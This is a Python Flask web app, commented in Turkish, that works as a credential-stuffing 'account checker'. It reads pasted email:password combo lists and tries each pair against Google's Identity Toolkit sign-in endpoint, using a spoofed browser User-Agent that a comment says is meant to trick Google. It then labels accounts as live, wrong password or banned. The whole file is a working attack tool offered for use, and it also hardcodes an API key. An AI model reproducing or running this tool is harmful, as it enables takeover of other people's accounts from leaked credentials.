import requests
import json
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ANAHTARIN (Tek parça, boşluksuz!)
API_KEY = "AIzaSyApwFQ4Refm3F7jygYcBogi3r8W4dtXZDY"

def check_account(email, password):
    # Google'ı kandırmak için gerçek tarayıcı gibi davranıyoruz
    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    payload = {
        "email": email, 
        "password": password, 
        "returnSecureToken": True
    }
    
    try:
        # verify=True kalsın, Google SSL hatası istemeyiz
        response = requests.post(url, data=json.dumps(payload), headers=headers, timeout=15)
        res_data = response.json()
        
        if response.status_code == 200:
            return "LIVE ✅"
        
        # Google'ın verdiği asıl hata kodunu söküp alıyoruz
        error_code = res_data.get('error', {}).get('message', 'UNKNOWN_ERROR')
        
        # Hata kodlarını Türkçeleştirip netleştiriyoruz
        error_map = {
            "EMAIL_NOT_FOUND": "HESAP YOK",
            "INVALID_PASSWORD": "SIFRE YANLIS",
            "USER_DISABLED": "HESAP BANLI",
            "OPERATION_NOT_ALLOWED": "FIREBASE'DE EMAIL KAPALI!",
            "INVALID_KEY": "API KEY HATALI!"
        }
        
        return error_map.get(error_code, f"GOOGLE_HATA: {error_code}")

    except Exception as e:
        return f"BAGLANTI_HATASI: {str(e)[:20]}"

@app.route('/')
def index(): return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    lines = data.get('combos', '').splitlines()
    results = []
    
    for line in lines:
        if ":" in line:
            email, pwd = line.split(":", 1)
            status = check_account(email.strip(), pwd.strip())
            results.append({"account": line.strip(), "status": status})
            
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
